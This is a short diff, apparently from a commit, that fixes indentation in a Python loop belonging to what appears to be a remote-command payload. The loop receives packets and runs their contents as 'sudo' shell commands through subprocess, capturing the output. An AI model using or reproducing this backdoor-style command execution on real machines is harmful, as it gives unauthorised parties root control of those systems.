@@ -36,9 +36,9 @@ while True:
     
     # If we recieved nothing, continue loop
     # Else, we attempt to parse the recieved message and run a command
-	if packet is None:
-		continue
-	else:
+    if packet is None:
+        continue
+    else:
         # Change the standard output to 'buffer' variable
 		sys.stdout = buffer = StringIO()
 
@@ -49,7 +49,7 @@ while True:
 		if(prev_packet == "quit"):
 			break
 		else:
-            # Run the command received, and print the output to the 'buffer' variable
+			# Run the command received, and print the output to the 'buffer' variable
 			print("[Payload] Running command : "+prev_packet)
 			print(subprocess.getoutput("sudo "+prev_packet))
 
@@ -63,4 +63,4 @@ while True:
 		print(buffer.getvalue())
     
     # Wait to optimize performance
-	time.sleep(0.1)
+    time.sleep(0.1)
